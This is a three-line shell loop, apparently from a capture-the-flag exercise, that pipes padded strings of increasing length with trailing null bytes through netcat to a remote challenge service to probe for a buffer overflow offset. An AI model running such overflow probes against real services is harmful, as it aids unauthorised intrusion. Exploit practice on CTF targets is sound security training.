for i in $(seq 64 8 200); do
  python3 -c "print('A'*$i + '\x00'*8)" | nc ctf.wackattack.eu 5001
done